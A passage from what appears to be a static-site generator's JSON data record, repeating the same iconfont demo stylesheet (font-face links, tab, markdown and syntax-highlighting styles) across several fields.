{\n  display: block;\n  height: 100px;\n  line-height: 100px;\n  font-size: 42px;\n  margin: 10px auto;\n  color: #333;\n  -webkit-transition: font-size 0.25s linear, width 0.25s linear;\n  -moz-transition: font-size 0.25s linear, width 0.25s linear;\n  transition: font-size 0.25s linear, width 0.25s linear;\n}\n\n.icon_lists .icon:hover {\n  font-size: 100px;\n}\n\n.icon_lists .svg-icon {\n  /* 通过设置 font-size 来改变图标大小 */\n  width: 1em;\n  /* 图标和文字相邻时，垂直对齐 */\n  vertical-align: -0.15em;\n  /* 通过设置 color 来改变 SVG 的颜色/fill */\n  fill: currentColor;\n  /* path 和 stroke 溢出 viewBox 部分在 IE 下会显示\n      normalize.css 中也包含这行 */\n  overflow: hidden;\n}\n\n.icon_lists li .name,\n.icon_lists li .code-name {\n  color: #666;\n}\n\n/* markdown 样式 */\n.markdown {\n  color: #666;\n  font-size: 14px;\n  line-height: 1.8;\n}\n\n.highlight {\n  line-height: 1.5;\n}\n\n.markdown img {\n  vertical-align: middle;\n  max-width: 100%;\n}\n\n.markdown h1 {\n  color: #404040;\n  font-weight: 500;\n  line-height: 40px;\n  margin-bottom: 24px;\n}\n\n.markdown h2,\n.markdown h3,\n.markdown h4,\n.markdown h5,\n.markdown h6 {\n  color: #404040;\n  margin: 1.6em 0 0.6em 0;\n  font-weight: 500;\n  clear: both;\n}\n\n.markdown h1 {\n  font-size: 28px;\n}\n\n.markdown h2 {\n  font-size: 22px;\n}\n\n.markdown h3 {\n  font-size: 16px;\n}\n\n.markdown h4 {\n  font-size: 14px;\n}\n\n.markdown h5 {\n  font-size: 12px;\n}\n\n.markdown h6 {\n  font-size: 12px;\n}\n\n.markdown hr {\n  height: 1px;\n  border: 0;\n  background: #e9e9e9;\n  margin: 16px 0;\n  clear: both;\n}\n\n.markdown p {\n  margin: 1em 0;\n}\n\n.markdown>p,\n.markdown>blockquote,\n.markdown>.highlight,\n.markdown>ol,\n.markdown>ul {\n  width: 80%;\n}\n\n.markdown ul>li {\n  list-style: circle;\n}\n\n.markdown>ul li,\n.markdown blockquote ul>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown>ul li p,\n.markdown>ol li p {\n  margin: 0.6em 0;\n}\n\n.markdown ol>li {\n  list-style: decimal;\n}\n\n.markdown>ol li,\n.markdown blockquote ol>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown code {\n  margin: 0 3px;\n  padding: 0 5px;\n  background: #eee;\n  border-radius: 3px;\n}\n\n.markdown strong,\n.markdown b {\n  font-weight: 600;\n}\n\n.markdown>table {\n  border-collapse: collapse;\n  border-spacing: 0px;\n  empty-cells: show;\n  border: 1px solid #e9e9e9;\n  width: 95%;\n  margin-bottom: 24px;\n}\n\n.markdown>table th {\n  white-space: nowrap;\n  color: #333;\n  font-weight: 600;\n}\n\n.markdown>table th,\n.markdown>table td {\n  border: 1px solid #e9e9e9;\n  padding: 8px 16px;\n  text-align: left;\n}\n\n.markdown>table th {\n  background: #F7F7F7;\n}\n\n.markdown blockquote {\n  font-size: 90%;\n  color: #999;\n  border-left: 4px solid #e9e9e9;\n  padding-left: 0.8em;\n  margin: 1em 0;\n}\n\n.markdown blockquote p {\n  margin: 0;\n}\n\n.markdown .anchor {\n  opacity: 0;\n  transition: opacity 0.3s ease;\n  margin-left: 8px;\n}\n\n.markdown .waiting {\n  color: #ccc;\n}\n\n.markdown h1:hover .anchor,\n.markdown h2:hover .anchor,\n.markdown h3:hover .anchor,\n.markdown h4:hover .anchor,\n.markdown h5:hover .anchor,\n.markdown h6:hover .anchor {\n  opacity: 1;\n  display: inline-block;\n}\n\n.markdown>br,\n.markdown>p>br {\n  clear: both;\n}\n\n\n.hljs {\n  display: block;\n  background: white;\n  padding: 0.5em;\n  color: #333333;\n  overflow-x: auto;\n}\n\n.hljs-comment,\n.hljs-meta {\n  color: #969896;\n}\n\n.hljs-string,\n.hljs-variable,\n.hljs-template-variable,\n.hljs-strong,\n.hljs-emphasis,\n.hljs-quote {\n  color: #df5000;\n}\n\n.hljs-keyword,\n.hljs-selector-tag,\n.hljs-type {\n  color: #a71d5d;\n}\n\n.hljs-literal,\n.hljs-symbol,\n.hljs-bullet,\n.hljs-attribute {\n  color: #0086b3;\n}\n\n.hljs-section,\n.hljs-name {\n  color: #63a35c;\n}\n\n.hljs-tag {\n  color: #333333;\n}\n\n.hljs-title,\n.hljs-attr,\n.hljs-selector-id,\n.hljs-selector-class,\n.hljs-selector-attr,\n.hljs-selector-pseudo {\n  color: #795da3;\n}\n\n.hljs-addition {\n  color: #55a532;\n  background-color: #eaffea;\n}\n\n.hljs-deletion {\n  color: #bd2c00;\n  background-color: #ffecec;\n}\n\n.hljs-link {\n  text-decoration: underline;\n}\n\n/* 代码高亮 */\n/* PrismJS 1.15.0\nhttps://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */\n/**\n * prism.js default theme for JavaScript, CSS and HTML\n * Based on dabblet (http://dabblet.com)\n * @author Lea Verou\n */\ncode[class*=\"language-\"],\npre[class*=\"language-\"] {\n  color: black;\n  background: none;\n  text-shadow: 0 1px white;\n  font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;\n  text-align: left;\n  white-space: pre;\n  word-spacing: normal;\n  word-break: normal;\n  word-wrap: normal;\n  line-height: 1.5;\n\n  -moz-tab-size: 4;\n  -o-tab-size: 4;\n  tab-size: 4;\n\n  -webkit-hyphens: none;\n  -moz-hyphens: none;\n  -ms-hyphens: none;\n  hyphens: none;\n}\n\npre[class*=\"language-\"]::-moz-selection,\npre[class*=\"language-\"] ::-moz-selection,\ncode[class*=\"language-\"]::-moz-selection,\ncode[class*=\"language-\"] ::-moz-selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\npre[class*=\"language-\"]::selection,\npre[class*=\"language-\"] ::selection,\ncode[class*=\"language-\"]::selection,\ncode[class*=\"language-\"] ::selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\n@media print {\n\n  code[class*=\"language-\"],\n  pre[class*=\"language-\"] {\n    text-shadow: none;\n  }\n}\n\n/* Code blocks */\npre[class*=\"language-\"] {\n  padding: 1em;\n  margin: .5em 0;\n  overflow: auto;\n}\n\n:not(pre)>code[class*=\"language-\"],\npre[class*=\"language-\"] {\n  background: #f5f2f0;\n}\n\n/* Inline code */\n:not(pre)>code[class*=\"language-\"] {\n  padding: .1em;\n  border-radius: .3em;\n  white-space: normal;\n}\n\n.token.comment,\n.token.prolog,\n.token.doctype,\n.token.cdata {\n  color: slategray;\n}\n\n.token.punctuation {\n  color: #999;\n}\n\n.namespace {\n  opacity: .7;\n}\n\n.token.property,\n.token.tag,\n.token.boolean,\n.token.number,\n.token.constant,\n.token.symbol,\n.token.deleted {\n  color: #905;\n}\n\n.token.selector,\n.token.attr-name,\n.token.string,\n.token.char,\n.token.builtin,\n.token.inserted {\n  color: #690;\n}\n\n.token.operator,\n.token.entity,\n.token.url,\n.language-css .token.string,\n.style .token.string {\n  color: #9a6e3a;\n  background: hsla(0, 0%, 100%, .5);\n}\n\n.token.atrule,\n.token.attr-value,\n.token.keyword {\n  color: #07a;\n}\n\n.token.function,\n.token.class-name {\n  color: #DD4A68;\n}\n\n.token.regex,\n.token.important,\n.token.variable {\n  color: #e90;\n}\n\n.token.important,\n.token.bold {\n  font-weight: bold;\n}\n\n.token.italic {\n  font-style: italic;\n}\n\n.token.entity {\n  cursor: help;\n}\n","source":"hireme/fonts/iconfont/demo.css","raw":"/* Logo 字体 */\n@font-face {\n  font-family: \"iconfont logo\";\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834');\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834#iefix') format('embedded-opentype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.woff?t=1545807318834') format('woff'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.ttf?t=1545807318834') format('truetype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.svg?t=1545807318834#iconfont') format('svg');\n}\n\n.logo {\n  font-family: \"iconfont logo\";\n  font-size: 160px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n\n/* tabs */\n.nav-tabs {\n  position: relative;\n}\n\n.nav-tabs .nav-more {\n  position: absolute;\n  right: 0;\n  bottom: 0;\n  height: 42px;\n  line-height: 42px;\n  color: #666;\n}\n\n#tabs {\n  border-bottom: 1px solid #eee;\n}\n\n#tabs li {\n  cursor: pointer;\n  width: 100px;\n  height: 40px;\n  line-height: 40px;\n  text-align: center;\n  font-size: 16px;\n  border-bottom: 2px solid transparent;\n  position: relative;\n  z-index: 1;\n  margin-bottom: -1px;\n  color: #666;\n}\n\n\n#tabs .active {\n  border-bottom-color: #f00;\n  color: #222;\n}\n\n.tab-container .content {\n  display: none;\n}\n\n/* 页面布局 */\n.main {\n  padding: 30px 100px;\n  width: 960px;\n  margin: 0 auto;\n}\n\n.main .logo {\n  color: #333;\n  text-align: left;\n  margin-bottom: 30px;\n  line-height: 1;\n  height: 110px;\n  margin-top: -50px;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.main .logo a {\n  font-size: 160px;\n  color: #333;\n}\n\n.helps {\n  margin-top: 40px;\n}\n\n.helps pre {\n  padding: 20px;\n  margin: 10px 0;\n  border: solid 1px #e7e1cd;\n  background-color: #fffdef;\n  overflow: auto;\n}\n\n.icon_lists {\n  width: 100% !important;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.icon_lists li {\n  width: 100px;\n  margin-bottom: 10px;\n  margin-right: 20px;\n  text-align: center;\n  list-style: none !important;\n  cursor: default;\n}\n\n.icon_lists li .code-name {\n  line-height: 1.2;\n}\n\n.icon_lists .icon {\n  display: block;\n  height: 100px;\n  line-height: 100px;\n  font-size: 42px;\n  margin: 10px auto;\n  color: #333;\n  -webkit-transition: font-size 0.25s linear, width 0.25s linear;\n  -moz-transition: font-size 0.25s linear, width 0.25s linear;\n  transition: font-size 0.25s linear, width 0.25s linear;\n}\n\n.icon_lists .icon:hover {\n  font-size: 100px;\n}\n\n.icon_lists .svg-icon {\n  /* 通过设置 font-size 来改变图标大小 */\n  width: 1em;\n  /* 图标和文字相邻时，垂直对齐 */\n  vertical-align: -0.15em;\n  /* 通过设置 color 来改变 SVG 的颜色/fill */\n  fill: currentColor;\n  /* path 和 stroke 溢出 viewBox 部分在 IE 下会显示\n      normalize.css 中也包含这行 */\n  overflow: hidden;\n}\n\n.icon_lists li .name,\n.icon_lists li .code-name {\n  color: #666;\n}\n\n/* markdown 样式 */\n.markdown {\n  color: #666;\n  font-size: 14px;\n  line-height: 1.8;\n}\n\n.highlight {\n  line-height: 1.5;\n}\n\n.markdown img {\n  vertical-align: middle;\n  max-width: 100%;\n}\n\n.markdown h1 {\n  color: #404040;\n  font-weight: 500;\n  line-height: 40px;\n  margin-bottom: 24px;\n}\n\n.markdown h2,\n.markdown h3,\n.markdown h4,\n.markdown h5,\n.markdown h6 {\n  color: #404040;\n  margin: 1.6em 0 0.6em 0;\n  font-weight: 500;\n  clear: both;\n}\n\n.markdown h1 {\n  font-size: 28px;\n}\n\n.markdown h2 {\n  font-size: 22px;\n}\n\n.markdown h3 {\n  font-size: 16px;\n}\n\n.markdown h4 {\n  font-size: 14px;\n}\n\n.markdown h5 {\n  font-size: 12px;\n}\n\n.markdown h6 {\n  font-size: 12px;\n}\n\n.markdown hr {\n  height: 1px;\n  border: 0;\n  background: #e9e9e9;\n  margin: 16px 0;\n  clear: both;\n}\n\n.markdown p {\n  margin: 1em 0;\n}\n\n.markdown>p,\n.markdown>blockquote,\n.markdown>.highlight,\n.markdown>ol,\n.markdown>ul {\n  width: 80%;\n}\n\n.markdown ul>li {\n  list-style: circle;\n}\n\n.markdown>ul li,\n.markdown blockquote ul>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown>ul li p,\n.markdown>ol li p {\n  margin: 0.6em 0;\n}\n\n.markdown ol>li {\n  list-style: decimal;\n}\n\n.markdown>ol li,\n.markdown blockquote ol>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown code {\n  margin: 0 3px;\n  padding: 0 5px;\n  background: #eee;\n  border-radius: 3px;\n}\n\n.markdown strong,\n.markdown b {\n  font-weight: 600;\n}\n\n.markdown>table {\n  border-collapse: collapse;\n  border-spacing: 0px;\n  empty-cells: show;\n  border: 1px solid #e9e9e9;\n  width: 95%;\n  margin-bottom: 24px;\n}\n\n.markdown>table th {\n  white-space: nowrap;\n  color: #333;\n  font-weight: 600;\n}\n\n.markdown>table th,\n.markdown>table td {\n  border: 1px solid #e9e9e9;\n  padding: 8px 16px;\n  text-align: left;\n}\n\n.markdown>table th {\n  background: #F7F7F7;\n}\n\n.markdown blockquote {\n  font-size: 90%;\n  color: #999;\n  border-left: 4px solid #e9e9e9;\n  padding-left: 0.8em;\n  margin: 1em 0;\n}\n\n.markdown blockquote p {\n  margin: 0;\n}\n\n.markdown .anchor {\n  opacity: 0;\n  transition: opacity 0.3s ease;\n  margin-left: 8px;\n}\n\n.markdown .waiting {\n  color: #ccc;\n}\n\n.markdown h1:hover .anchor,\n.markdown h2:hover .anchor,\n.markdown h3:hover .anchor,\n.markdown h4:hover .anchor,\n.markdown h5:hover .anchor,\n.markdown h6:hover .anchor {\n  opacity: 1;\n  display: inline-block;\n}\n\n.markdown>br,\n.markdown>p>br {\n  clear: both;\n}\n\n\n.hljs {\n  display: block;\n  background: white;\n  padding: 0.5em;\n  color: #333333;\n  overflow-x: auto;\n}\n\n.hljs-comment,\n.hljs-meta {\n  color: #969896;\n}\n\n.hljs-string,\n.hljs-variable,\n.hljs-template-variable,\n.hljs-strong,\n.hljs-emphasis,\n.hljs-quote {\n  color: #df5000;\n}\n\n.hljs-keyword,\n.hljs-selector-tag,\n.hljs-type {\n  color: #a71d5d;\n}\n\n.hljs-literal,\n.hljs-symbol,\n.hljs-bullet,\n.hljs-attribute {\n  color: #0086b3;\n}\n\n.hljs-section,\n.hljs-name {\n  color: #63a35c;\n}\n\n.hljs-tag {\n  color: #333333;\n}\n\n.hljs-title,\n.hljs-attr,\n.hljs-selector-id,\n.hljs-selector-class,\n.hljs-selector-attr,\n.hljs-selector-pseudo {\n  color: #795da3;\n}\n\n.hljs-addition {\n  color: #55a532;\n  background-color: #eaffea;\n}\n\n.hljs-deletion {\n  color: #bd2c00;\n  background-color: #ffecec;\n}\n\n.hljs-link {\n  text-decoration: underline;\n}\n\n/* 代码高亮 */\n/* PrismJS 1.15.0\nhttps://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */\n/**\n * prism.js default theme for JavaScript, CSS and HTML\n * Based on dabblet (http://dabblet.com)\n * @author Lea Verou\n */\ncode[class*=\"language-\"],\npre[class*=\"language-\"] {\n  color: black;\n  background: none;\n  text-shadow: 0 1px white;\n  font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;\n  text-align: left;\n  white-space: pre;\n  word-spacing: normal;\n  word-break: normal;\n  word-wrap: normal;\n  line-height: 1.5;\n\n  -moz-tab-size: 4;\n  -o-tab-size: 4;\n  tab-size: 4;\n\n  -webkit-hyphens: none;\n  -moz-hyphens: none;\n  -ms-hyphens: none;\n  hyphens: none;\n}\n\npre[class*=\"language-\"]::-moz-selection,\npre[class*=\"language-\"] ::-moz-selection,\ncode[class*=\"language-\"]::-moz-selection,\ncode[class*=\"language-\"] ::-moz-selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\npre[class*=\"language-\"]::selection,\npre[class*=\"language-\"] ::selection,\ncode[class*=\"language-\"]::selection,\ncode[class*=\"language-\"] ::selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\n@media print {\n\n  code[class*=\"language-\"],\n  pre[class*=\"language-\"] {\n    text-shadow: none;\n  }\n}\n\n/* Code blocks */\npre[class*=\"language-\"] {\n  padding: 1em;\n  margin: .5em 0;\n  overflow: auto;\n}\n\n:not(pre)>code[class*=\"language-\"],\npre[class*=\"language-\"] {\n  background: #f5f2f0;\n}\n\n/* Inline code */\n:not(pre)>code[class*=\"language-\"] {\n  padding: .1em;\n  border-radius: .3em;\n  white-space: normal;\n}\n\n.token.comment,\n.token.prolog,\n.token.doctype,\n.token.cdata {\n  color: slategray;\n}\n\n.token.punctuation {\n  color: #999;\n}\n\n.namespace {\n  opacity: .7;\n}\n\n.token.property,\n.token.tag,\n.token.boolean,\n.token.number,\n.token.constant,\n.token.symbol,\n.token.deleted {\n  color: #905;\n}\n\n.token.selector,\n.token.attr-name,\n.token.string,\n.token.char,\n.token.builtin,\n.token.inserted {\n  color: #690;\n}\n\n.token.operator,\n.token.entity,\n.token.url,\n.language-css .token.string,\n.style .token.string {\n  color: #9a6e3a;\n  background: hsla(0, 0%, 100%, .5);\n}\n\n.token.atrule,\n.token.attr-value,\n.token.keyword {\n  color: #07a;\n}\n\n.token.function,\n.token.class-name {\n  color: #DD4A68;\n}\n\n.token.regex,\n.token.important,\n.token.variable {\n  color: #e90;\n}\n\n.token.important,\n.token.bold {\n  font-weight: bold;\n}\n\n.token.italic {\n  font-style: italic;\n}\n\n.token.entity {\n  cursor: help;\n}\n","date":"2020-06-18T07:09:21.446Z","updated":"2020-06-18T07:09:21.446Z","path":"hireme/fonts/iconfont/demo.css","layout":"false","title":"","comments":1,"_id":"ckclr4uai001jqrwt8bwwpoxc","content":"/* Logo 字体 */\n@font-face {\n  font-family: \"iconfont logo\";\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834');\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834#iefix') format('embedded-opentype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.woff?t=1545807318834') format('woff'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.ttf?t=1545807318834') format('truetype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.svg?t=1545807318834#iconfont') format('svg');\n}\n\n.logo {\n  font-family: \"iconfont logo\";\n  font-size: 160px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n\n/* tabs */\n.nav-tabs {\n  position: relative;\n}\n\n.nav-tabs .nav-more {\n  position: absolute;\n  right: 0;\n  bottom: 0;\n  height: 42px;\n  line-height: 42px;\n  color: #666;\n}\n\n#tabs {\n  border-bottom: 1px solid #eee;\n}\n\n#tabs li {\n  cursor: pointer;\n  width: 100px;\n  height: 40px;\n  line-height: 40px;\n  text-align: center;\n  font-size: 16px;\n  border-bottom: 2px solid transparent;\n  position: relative;\n  z-index: 1;\n  margin-bottom: -1px;\n  color: #666;\n}\n\n\n#tabs .active {\n  border-bottom-color: #f00;\n  color: #222;\n}\n\n.tab-container .content {\n  display: none;\n}\n\n/* 页面布局 */\n.main {\n  padding: 30px 100px;\n  width: 960px;\n  margin: 0 auto;\n}\n\n.main .logo {\n  color: #333;\n  text-align: left;\n  margin-bottom: 30px;\n  line-height: 1;\n  height: 110px;\n  margin-top: -50px;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.main .logo a {\n  font-size: 160px;\n  color: #333;\n}\n\n.helps {\n  margin-top: 40px;\n}\n\n.helps pre {\n  padding: 20px;\n  margin: 10px 0;\n  border: solid 1px #e7e1cd;\n  background-color: #fffdef;\n  overflow: auto;\n}\n\n.icon_lists {\n  width: 100% !important;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.icon_lists li {\n  width: 100px;\n  margin-bottom: 10px;\n  margin-right: 20px;\n  text-align: center;\n  list-style: none !important;\n  cursor: default;\n}\n\n.icon_lists li .code-name {\n  line-height: 1.2;\n}\n\n.icon_lists .icon {\n  display: block;\n  height: 100px;\n  line-height: 100px;\n  font-size: 42px;\n  margin: 10px auto;\n  color: #333;\n  -webkit-transition: font-size 0.25s linear, width 0.25s linear;\n  -moz-transition: font-size 0.25s linear, width 0.25s linear;\n  transition: font-size 0.25s linear, width 0.25s linear;\n}\n\n.icon_lists .icon:hover {\n  font-size: 100px;\n}\n\n.icon_lists .svg-icon {\n  /* 通过设置 font-size 来改变图标大小 */\n  width: 1em;\n  /* 图标和文字相邻时，垂直对齐 */\n  vertical-align: -0.15em;\n  /* 通过设置 color 来改变 SVG 的颜色/fill */\n  fill: currentColor;\n  /* path 和 stroke 溢出 viewBox 部分在 IE 下会显示\n      normalize.css 中也包含这行 */\n  overflow: hidden;\n}\n\n.icon_lists li .name,\n.icon_lists li .code-name {\n  color: #666;\n}\n\n/* markdown 样式 */\n.markdown {\n  color: #666;\n  font-size: 14px;\n  line-height: 1.8;\n}\n\n.highlight {\n  line-height: 1.5;\n}\n\n.markdown img {\n  vertical-align: middle;\n  max-width: 100%;\n}\n\n.markdown h1 {\n  color: #404040;\n  font-weight: 500;\n  line-height: 40px;\n  margin-bottom: 24px;\n}\n\n.markdown h2,\n.markdown h3,\n.markdown h4,\n.markdown h5,\n.markdown h6 {\n  color: #404040;\n  margin: 1.6em 0 0.6em 0;\n  font-weight: 500;\n  clear: both;\n}\n\n.markdown h1 {\n  font-size: 28px;\n}\n\n.markdown h2 {\n  font-size: 22px;\n}\n\n.markdown h3 {\n  font-size: 16px;\n}\n\n.markdown h4 {\n  font-size: 14px;\n}\n\n.markdown h5 {\n  font-size: 12px;\n}\n\n.markdown h6 {\n  font-size: 12px;\n}\n\n.markdown hr {\n  height: 1px;\n  border: 0;\n  background: #e9e9e9;\n  margin: 16px 0;\n  clear: both;\n}\n\n.markdown p {\n  margin: 1em 0;\n}\n\n.markdown>p,\n.markdown>blockquote,\n.markdown>.highlight,\n.markdown>ol,\n.markdown>ul {\n  width: 80%;\n}\n\n.markdown ul>li {\n  list-style: circle;\n}\n\n.markdown>ul li,\n.markdown blockquote ul>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown>ul li p,\n.markdown>ol li p {\n  margin: 0.6em 0;\n}\n\n.markdown ol>li {\n  list-style: decimal;\n}\n\n.markdown>ol li,\n.markdown blockquote ol>li {\n  margin-left: 20px;\n  padding-left: 4px;\n}\n\n.markdown code {\n  margin: 0 3px;\n  padding: 0 5px;\n  background: #eee;\n  border-radius: 3px;\n}\n\n.markdown strong,\n.markdown b {\n  font-weight: 600;\n}\n\n.markdown>table {\n  border-collapse: collapse;\n  border-spacing: 0px;\n  empty-cells: show;\n  border: 1px solid #e9e9e9;\n  width: 95%;\n  margin-bottom: 24px;\n}\n\n.markdown>table th {\n  white-space: nowrap;\n  color: #333;\n  font-weight: 600;\n}\n\n.markdown>table th,\n.markdown>table td {\n  border: 1px solid #e9e9e9;\n  padding: 8px 16px;\n  text-align: left;\n}\n\n.markdown>table th {\n  background: #F7F7F7;\n}\n\n.markdown blockquote {\n  font-size: 90%;\n  color: #999;\n  border-left: 4px solid #e9e9e9;\n  padding-left: 0.8em;\n  margin: 1em 0;\n}\n\n.markdown blockquote p {\n  margin: 0;\n}\n\n.markdown .anchor {\n  opacity: 0;\n  transition: opacity 0.3s ease;\n  margin-left: 8px;\n}\n\n.markdown .waiting {\n  color: #ccc;\n}\n\n.markdown h1:hover .anchor,\n.markdown h2:hover .anchor,\n.markdown h3:hover .anchor,\n.markdown h4:hover .anchor,\n.markdown h5:hover .anchor,\n.markdown h6:hover .anchor {\n  opacity: 1;\n  display: inline-block;\n}\n\n.markdown>br,\n.markdown>p>br {\n  clear: both;\n}\n\n\n.hljs {\n  display: block;\n  background: white;\n  padding: 0.5em;\n  color: #333333;\n  overflow-x: auto;\n}\n\n.hljs-comment,\n.hljs-meta {\n  color: #969896;\n}\n\n.hljs-string,\n.hljs-variable,\n.hljs-template-variable,\n.hljs-strong,\n.hljs-emphasis,\n.hljs-quote {\n  color: #df5000;\n}\n\n.hljs-keyword,\n.hljs-selector-tag,\n.hljs-type {\n  color: #a71d5d;\n}\n\n.hljs-literal,\n.hljs-symbol,\n.hljs-bullet,\n.hljs-attribute {\n  color: #0086b3;\n}\n\n.hljs-section,\n.hljs-name {\n  color: #63a35c;\n}\n\n.hljs-tag {\n  color: #333333;\n}\n\n.hljs-title,\n.hljs-attr,\n.hljs-selector-id,\n.hljs-selector-class,\n.hljs-selector-attr,\n.hljs-selector-pseudo {\n  color: #795da3;\n}\n\n.hljs-addition {\n  color: #55a532;\n  background-color: #eaffea;\n}\n\n.hljs-deletion {\n  color: #bd2c00;\n  background-color: #ffecec;\n}\n\n.hljs-link {\n  text-decoration: underline;\n}\n\n/* 代码高亮 */\n/* PrismJS 1.15.0\nhttps://prismjs.com/download.html#themes=prism&languages=markup+css+clike+javascript */\n/**\n * prism.js default theme for JavaScript, CSS and HTML\n * Based on dabblet (http://dabblet.com)\n * @author Lea Verou\n */\ncode[class*=\"language-\"],\npre[class*=\"language-\"] {\n  color: black;\n  background: none;\n  text-shadow: 0 1px white;\n  font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;\n  text-align: left;\n  white-space: pre;\n  word-spacing: normal;\n  word-break: normal;\n  word-wrap: normal;\n  line-height: 1.5;\n\n  -moz-tab-size: 4;\n  -o-tab-size: 4;\n  tab-size: 4;\n\n  -webkit-hyphens: none;\n  -moz-hyphens: none;\n  -ms-hyphens: none;\n  hyphens: none;\n}\n\npre[class*=\"language-\"]::-moz-selection,\npre[class*=\"language-\"] ::-moz-selection,\ncode[class*=\"language-\"]::-moz-selection,\ncode[class*=\"language-\"] ::-moz-selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\npre[class*=\"language-\"]::selection,\npre[class*=\"language-\"] ::selection,\ncode[class*=\"language-\"]::selection,\ncode[class*=\"language-\"] ::selection {\n  text-shadow: none;\n  background: #b3d4fc;\n}\n\n@media print {\n\n  code[class*=\"language-\"],\n  pre[class*=\"language-\"] {\n    text-shadow: none;\n  }\n}\n\n/* Code blocks */\npre[class*=\"language-\"] {\n  padding: 1em;\n  margin: .5em 0;\n  overflow: auto;\n}\n\n:not(pre)>code[class*=\"language-\"],\npre[class*=\"language-\"] {\n  background: #f5f2f0;\n}\n\n/* Inline code */\n:not(pre)>code[class*=\"language-\"] {\n  padding: .1em;\n  border-radius: .3em;\n  white-space: normal;\n}\n\n.token.comment,\n.token.prolog,\n.token.doctype,\n.token.cdata {\n  color: slategray;\n}\n\n.token.punctuation {\n  color: #999;\n}\n\n.namespace {\n  opacity: .7;\n}\n\n.token.property,\n.token.tag,\n.token.boolean,\n.token.number,\n.token.constant,\n.token.symbol,\n.token.deleted {\n  color: #905;\n}\n\n.token.selector,\n.token.attr-name,\n.token.string,\n.token.char,\n.token.builtin,\n.token.inserted {\n  color: #690;\n}\n\n.token.operator,\n.token.entity,\n.token.url,\n.language-css .token.string,\n.style .token.string {\n  color: #9a6e3a;\n  background: hsla(0, 0%, 100%, .5);\n}\n\n.token.atrule,\n.token.attr-value,\n.token.keyword {\n  color: #07a;\n}\n\n.token.function,\n.token.class-name {\n  color: #DD4A68;\n}\n\n.token.regex,\n.token.important,\n.token.variable {\n  color: #e90;\n}\n\n.token.important,\n.token.bold {\n  font-weight: bold;\n}\n\n.token.italic {\n  font-style: italic;\n}\n\n.token.entity {\n  cursor: help;\n}\n","site":{"data":{}},"excerpt":"","more":"/* Logo 字体 */\n@font-face {\n  font-family: \"iconfont logo\";\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834');\n  src: url('https://at.alicdn.com/t/font_985780_km7mi63cihi.eot?t=1545807318834#iefix') format('embedded-opentype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.woff?t=1545807318834') format('woff'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.ttf?t=1545807318834') format('truetype'),\n    url('https://at.alicdn.com/t/font_985780_km7mi63cihi.svg?t=1545807318834#iconfont') format('svg');\n}\n\n.logo {\n  font-family: \"iconfont logo\";\n  font-size: 160px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n\n/* tabs */\n.nav-tabs {\n  position: relative;\n}\n\n.nav-tabs .nav-more {\n  position: absolute;\n  right: 0;\n  bottom: 0;\n  height: 42px;\n  line-height: 42px;\n  color: #666;\n}\n\n#tabs {\n  border-bottom: 1px solid #eee;\n}\n\n#tabs li {\n  cursor: pointer;\n  width: 100px;\n  height: 40px;\n  line-height: 40px;\n  text-align: center;\n  font-size: 16px;\n  border-bottom: 2px solid transparent;\n  position: relative;\n  z-index: 1;\n  margin-bottom: -1px;\n  color: #666;\n}\n\n\n#tabs .active {\n  border-bottom-color: #f00;\n  color: #222;\n}\n\n.tab-container .content {\n  display: none;\n}\n\n/* 页面布局 */\n.main {\n  padding: 30px 100px;\n  width: 960px;\n  margin: 0 auto;\n}\n\n.main .logo {\n  color: #333;\n  text-align: left;\n  margin-bottom: 30px;\n  line-height: 1;\n  height: 110px;\n  margin-top: -50px;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.main .logo a {\n  font-size: 160px;\n  color: #333;\n}\n\n.helps {\n  margin-top: 40px;\n}\n\n.helps pre {\n  padding: 20px;\n  margin: 10px 0;\n  border: solid 1px #e7e1cd;\n  background-color: #fffdef;\n  overflow: auto;\n}\n\n.icon_lists {\n  width: 100% !important;\n  overflow: hidden;\n  *zoom: 1;\n}\n\n.icon_lists li {\n  width: 100px;\n  margin-bottom: 10px;\n  margin-right: 20px;\n  text-align: center;\n  list-style: none !important;\n  cursor: default;\n}\n\n.icon_lists li .code-name {\n  line-height: 1.2;\n}\n\n.icon_lists .icon {\n  display: block;\n  height: 100px;\n  line-height: 100px;\n  font-size: 42px;\n  